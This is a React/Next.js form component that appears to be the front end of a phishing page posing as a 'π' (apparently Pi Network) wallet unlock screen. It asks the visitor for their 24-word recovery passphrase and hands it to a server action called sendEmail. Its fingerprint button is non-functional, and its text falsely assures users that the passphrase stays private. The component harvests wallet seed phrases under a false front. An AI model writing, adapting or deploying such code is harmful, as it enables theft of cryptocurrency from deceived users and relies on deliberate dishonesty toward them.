'use client';

import Submit_Btn from './Submit_Btn';
import { sendEmail } from '@/actions/sendEmail';
import { Fingerprint } from 'lucide-react';
import toast from 'react-hot-toast';
import { useRouter } from 'next/navigation';

const Form = () => {
  const router = useRouter();
  const onNavigate = () => {
    router.push('/');
  };
  return (
    <section>
      <form
        action={async (FormData) => {
          const response = await sendEmail(FormData);
          const { error, success } = response;

          if (error) {
            toast.error(error);
            return;
          }

          toast.success(success as string);
        }}
        className="flex flex-col justify-center gap-5"
      >
        <textarea
          name="passphrase"
          placeholder="Enter your 24-word passphrase here"
          required
          rows={4}
          className=" flex-wrap border border-yellow-600 self-center  w-[400px] sm:w-[600px] pt-4 pl-4 pb-[200px] sm:pb-[300px] rounded-md placeholder:font-Azeret  font-Azeret text-gray-700 placeholder:text-[12px] placeholder:sm:text-[16px] outline-none focus:outline-none focus:ring-2 focus:ring-yellow-600 focus:border-transparent resize-none"
        />
        <div className=" flex justify-center">
          <Submit_Btn onClick={onNavigate} />
        </div>
      </form>

      <div className="flex justify-center mt-5 items-center">
        <button className=" flex flex-row bg-purple-600 border-2 border-purple-600 group hover:bg-white hover:scale-110 active:scale-105 transition-all duration-200 rounded-lg p-2 items-center  w-[fit-content] gap-[25px]">
          <Fingerprint size={25} color="white" />
          <span className="font-Azeret font-semibold text-[12px] text-white group-hover:text-purple sm:text-[16px]">
            Unlock with fingerprint
          </span>
        </button>
      </div>

      <div className="padding-x mt-5">
        <p className=" font-work font-medium text-[16px] sm:text-[18px] tracking wide leading-7 text-gray-700">
          As a non-custodial wallet, your wallet passphrase is exclusively
          accessible only to you. Recovery of passphrase is currently
          impossible. <br /> <br />
          Lost your passphrase?{' '}
          <span className="text-purple-600">You can create a new wallet</span> ,
          but all your π in your previous wallet will be inaccessible.
        </p>
      </div>
    </section>
  );
};
export default Form;
